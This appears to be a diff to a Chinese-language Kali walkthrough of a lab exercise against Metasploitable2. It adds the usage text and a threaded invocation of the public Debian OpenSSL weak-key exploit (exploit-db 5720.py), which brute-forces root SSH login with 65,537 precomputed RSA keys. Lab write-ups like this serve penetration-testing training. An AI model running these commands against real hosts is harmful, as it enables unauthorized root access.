@@ -65,8 +65,16 @@ PHP 5.x OpenSSL Extension x Function openssl_decrypt Ciphertext Data Memory Leak
 [root@kali: ~#] ls -l rsa/2048/ |wc -l
 65537
 #看脚本使用说明，貌似跟前面的密码暴力破解是一个原理?
+[root@kali: ~#] python /usr/share/exploitdb/platforms/linux/remote/5720.py
+-OpenSSL Debian exploit- by ||WarCat team|| warcat.no-ip.org
+./exploit.py <dir> <host> <user> [[port] [threads]]
+    <dir>: Path to SSH privatekeys (ex. /home/john/keys) without final slash
+    <host>: The victim host
+    <user>: The user of the victim host
+    [port]: The SSH port of the victim host (default 22)
+    [threads]: Number of threads (default 4) Too big numer is bad
 #先跑起来看看哦~~~
-[root@kali: ~#] python /usr/share/exploitdb/platforms/linux/remote/5720.py rsa/2048/ metasploitable2 root 22
+[root@kali: ~#] python /usr/share/exploitdb/platforms/linux/remote/5720.py rsa/2048/ metasploitable2 root 22 10
 ....
 #要跑完6w多个，看样子有得等哦~~~抽支烟，喝杯茶！
 #继续等。。。
